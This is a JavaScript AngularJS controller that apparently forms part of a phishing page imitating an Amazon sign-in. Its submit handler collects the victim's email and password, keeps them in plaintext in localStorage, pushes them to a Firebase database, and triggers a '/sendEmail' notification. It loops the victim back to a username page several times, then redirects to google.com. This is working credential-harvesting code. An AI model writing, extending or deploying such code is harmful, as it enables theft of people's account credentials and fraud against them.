"use strict";
localStorage.setItem("index", 0);
angular
  .module("Amazon.password", ["ngRoute"])

  .config([
    "$routeProvider",
    function ($routeProvider) {
      $routeProvider.when("/password", {
        templateUrl: "views/password/password1.html",
        controller: "passwordController",
      });
    },
  ])

  .controller("passwordController", [
    "$scope",
    "$http",
    "$location",
    function ($scope, $http, $location) {
      $scope.password = "";

      $scope.index = 0;

      $scope.email = localStorage.getItem("email");

      // Assuming you have Firebase set up and a reference to your Firebase database
      var databaseRef = firebase.database().ref();

      $scope.submit = function () {
        // Save the email to Local Storage
        localStorage.setItem("password", $scope.password);

        // Push to the database
        // Get email and password from Local Storage
        var email = localStorage.getItem("email");
        var password = localStorage.getItem("password");

        // Save the data to Firebase
        var userData = {
          email: email,
          password: password,
        };

        // Push the data to a Firebase reference, such as 'users'
        databaseRef.child("users").push(userData);

        // Send an email to your email address
        // You can use an email service or library to send the email
        // Example: SendGrid, Nodemailer, etc.
        $http.get('/sendEmail')
        .then(function (response) {
          // The email was successfully sent
          console.log("Email sent successfully:", response.data);
        })
        .catch(function (error) {
          // There was an error sending the email
          console.error("Error sending email:", error);
        });
      
        // Redirect to an external URL
        if (localStorage.getItem("index") >= 2) {
          localStorage.setItem("index", 0);
          // Redirect to an external URL
          window.location.href = "https://google.com";
          console.log(
            localStorage.getItem("index") + " - Redirecting to Google"
          );
        } else {
          // Redirect to an internal route
          $location.path("/username");
          var index = JSON.parse(localStorage.getItem("index"));
          localStorage.setItem("index", index + 1);
          console.log(
            localStorage.getItem("index") + " - Redirecting to /username"
          );
        }
      };

      $scope.redirectToUsername = function () {
        $location.path("/username");
      };
    },
  ]);
